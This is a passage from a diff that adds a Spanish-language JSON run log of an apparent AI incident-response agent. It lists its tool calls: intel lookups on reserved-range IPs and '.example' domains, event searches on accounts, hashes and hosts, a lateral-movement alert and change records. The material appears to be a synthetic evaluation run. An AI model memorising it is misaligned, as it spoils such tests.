+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.175.29"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.175.90"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.187.1"
+      },
+      "origen": "incidentes",
+      "ms": 0,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.187.151"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.187.5"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/packaging-iberia-pagos.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 73,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/203.0.113.180"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 257,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/packaging-iberia-portal.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 74,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.187.148"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.186.183"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.199.183"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/pos-update-service.example"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 69,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.198.224"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.199.180"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.199.116"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.210.119"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.211.156"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.222.203"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.223.17"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.222.73"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.222.198"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.234.182"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.234.83"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.234.229"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.246.122"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.245.181"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.246.117"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.245.227"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 258,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.1.108"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.1.46"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 252,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.2.69"
+      },
+      "origen": "incidentes",
+      "ms": 0,
+      "chars": 252,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.18.1.247"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.13.67"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.12.240"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.13.137"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.13.142"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.14.23"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.25.60"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.24.236"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.25.195"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.24.167"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.25.122"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.25.57"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.36.100"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.36.234"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.36.172"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.36.229"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.36.96"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.48.145"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.49.46"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.48.221"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.48.18"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.49.42"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.48.13"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.48.217"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.59.226"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.60.67"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.60.23"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.60.171"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.60.120"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.60.20"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 254,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.60.117"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.71.149"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.71.247"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.72.2"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 252,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "intel",
+      "args": {
+        "ruta": "/intel/198.19.71.196"
+      },
+      "origen": "incidentes",
+      "ms": 1,
+      "chars": 256,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "marta.puig",
+        "desde": "",
+        "hasta": "",
+        "fuentes": [
+          "idp_signins",
+          "vpn",
+          "cloudtrail"
+        ]
+      },
+      "origen": "agente",
+      "ms": 4,
+      "chars": 71,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "",
+        "hasta": "",
+        "fuentes": [
+          "idp_signins",
+          "vpn",
+          "cloudtrail"
+        ]
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "svc_print_upd",
+        "desde": "",
+        "hasta": "",
+        "fuentes": [
+          "idp_signins",
+          "vpn",
+          "cloudtrail"
+        ]
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 0,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "pedidos-hilaturas-alcoi.example",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "ff0b946ebe8dc45dca38173f2fd0592722be06322236d3acf3fc743eb9c51853",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "521bce57f7fe9fda56ead8d729484e134a4a1a73fec8c867698ea297a4df72e3",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "9dd6d63b39062871d97565ca7a98d52dc8c329cc61ec22c27295aab29d646243",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 2,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "0abd51be4e6e6b6f40c60280815ccd51207c4d40318354dcd9fd25372f47763c",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "f1932fbb0101bdb901fee55aa4525c72be3e9e3d2e834947adf0f6b0e5cff1c9",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "cc4f10c3842eb781de989fad673a9b7b2945c5972d215085f1ededd94559c288",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "aplihartom.com",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 31,
+      "chars": 1297,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "aplihartom.com",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 7,
+      "chars": 300,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "203.0.113.88",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 8,
+      "chars": 300,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "3634e8cc4ad82ba8985c6eb9cf5ce8d6fcdfa1931e6431826999b87dae978768",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 2,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 2,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "FS01",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 9,
+      "chars": 326,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "PRINT01",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 6,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "WS-BCN-1770",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 37,
+      "chars": 1583,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "d57dc9e0b06bfa3ba5d249da53584a9baa97ce9027c6a5a6fe26d9ba03f1b480",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 3,
+      "chars": 79,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "www.dropbox.com",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 8,
+      "chars": 300,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "107.174.115.43",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 1,
+      "chars": 50,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "107.174.115.43",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 1,
+      "chars": 50,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "203.0.113.88",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 33,
+      "chars": 1296,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "81.28.167.30",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "adm.aortega",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 8,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "marta.puig",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 36,
+      "chars": 1525,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "svc_print_upd",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 2,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "198.18.46.40",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "adm.dnavarro",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 4,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "JUMP01",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 3,
+      "chars": 102,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "ERP-APP01",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 0,
+      "chars": 1,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "indice:eventos_de",
+      "args": {
+        "q": "HR-APP01",
+        "desde": "2026-10-02T09:08:48Z",
+        "hasta": "2026-10-21T01:22:06Z"
+      },
+      "origen": "agente",
+      "ms": 2,
+      "chars": 96,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "consultar_alerta",
+      "args": {
+        "alert_id": "ALR-20261013-011869"
+      },
+      "origen": "agente",
+      "ms": 2,
+      "chars": 768,
+      "error": null,
+      "preview": "{\"alert_id\": \"ALR-20261013-011869\", \"created_at\": \"2026-10-13T08:31:43.000Z\", \"source_product\": \"NGFW\", \"rule_id\": \"UC-NET-004\", \"rule_name\": \"Movimiento lateral SMB/RDP/PsExec\", \"severity\": \"high\", \"status\": \"new\", \"mitre\": {\"tactic\": \"Lateral Movement\", \"technique_id\": \"T1021.002\", \"technique\": \"S"
+    },
+    {
+      "tool": "buscar_cambios",
+      "args": {
+        "texto": "adm.dnavarro"
+      },
+      "origen": "agente",
+      "ms": 4,
+      "chars": 2,
+      "error": null,
+      "preview": "[]"
+    },
+    {
+      "tool": "buscar_cambios",
+      "args": {
+        "texto": "agente"
+      },
+      "origen": "agente",
+      "ms": 5,
+      "chars": 549,
+      "error": null,
+      "preview": "[{\"id\": \"CHG-2026-1057\", \"titulo\": \"Despliegue agente de monitorización 3.4 en servidores\", \"inicio\": \"2026-10-13 10:00\", \"fin\": \"2026-10-13 13:00\", \"solicitante\": \"Tecnología\", \"detalle\": \"PsExec desde JUMP01 con cuenta adm\", \"alcance\": \"ERP-APP01, HR-APP01, PRINT01, CRM-APP01\"}, {\"id\": \"CHG-2026-1"
+    },
+    {
+      "tool": "consultar_usuario",
+      "args": {
+        "upn_o_username": "marta.puig@tarvia.example"
+      },
+      "origen": "agente",
+      "ms": 5,
+      "chars": 433,
+      "error": null,
+      "preview": "{\"user_id\": \"U1770\", \"username\": \"marta.puig\", \"upn\": \"marta.puig@tarvia.example\", \"display_name\": \"Marta Puig\", \"department\": \"Compras\", \"title\": \"Compradora Senior\", \"location\": \"Barcelona HQ\", \"manager_upn\": \"andrea.lozano2@tarvia.example\", \"account_type\": \"user\", \"privileged\": \"False\", \"vip\": \"F"
+    },
+    {
+      "tool": "buscar_logs",
+      "args": {
+        "fuente": "idp_signins",
+        "texto": "marta.puig@tarvia.example",
+        "desde": "",
+        "hasta": ""
+      },
+      "origen": "agente",
+      "ms": 296,
+      "chars": 30376,
+      "error": null,
+      "preview": "{\"count\": 50, \"truncated\": true, \"items\": [{\"event_id\": \"SIGN-0002525\", \"timestamp\": \"2026-10-05T08:26:49.241Z\", \"user_upn\": \"marta.puig@tarvia.example\", \"app\": \"SharePoint Online\", \"result\": \"success\", \"failure_reason\": \"\", \"mfa_method\": \"push\", \"mfa_result\": \"approved\", \"src_ip\": \"198.18.200.10\", "
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/assets/WS-BCN-1770"
+      },
+      "origen": "politica",
+      "ms": 5,
+      "chars": 364,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/assets/PRINT01"
+      },
+      "origen": "politica",
+      "ms": 4,
+      "chars": 544,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/assets/FS01"
+      },
+      "origen": "politica",
+      "ms": 5,
+      "chars": 611,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/intel/aplihartom.com"
+      },
+      "origen": "politica",
+      "ms": 4,
+      "chars": 330,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/intel/107.174.115.43"
+      },
+      "origen": "politica",
+      "ms": 3,
+      "chars": 531,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/intel/203.0.113.88"
+      },
+      "origen": "politica",
+      "ms": 3,
+      "chars": 517,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/intel/70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44"
+      },
+      "origen": "politica",
+      "ms": 2,
+      "chars": 107,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/intel/0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697"
+      },
+      "origen": "politica",
+      "ms": 2,
+      "chars": 431,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/sandbox/0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697"
+      },
+      "origen": "politica",
+      "ms": 2,
+      "chars": 619,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/intel/3634e8cc4ad82ba8985c6eb9cf5ce8d6fcdfa1931e6431826999b87dae978768"
+      },
+      "origen": "politica",
+      "ms": 2,
+      "chars": 107,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/sandbox/3634e8cc4ad82ba8985c6eb9cf5ce8d6fcdfa1931e6431826999b87dae978768"
+      },
+      "origen": "politica",
+      "ms": 1,
+      "chars": 551,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/intel/6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466"
+      },
+      "origen": "politica",
+      "ms": 1,
+      "chars": 107,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/sandbox/6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466"
+      },
+      "origen": "politica",
+      "ms": 1,
+      "chars": 786,
+      "error": null,
+      "preview": ""
+    },
+    {
+      "tool": "politica",
+      "args": {
+        "ruta": "/intel/81.28.167.30"
+      },
+      "origen": "politica",
+      "ms": 1,
+      "chars": 544,
+      "error": null,
+      "preview": ""
+    }
+  ],
+  "razonamiento": [],
+  "uso": {
+    "input_tokens": 128285,
+    "output_tokens": 3863,
+    "llamadas_modelo": 6
+  },
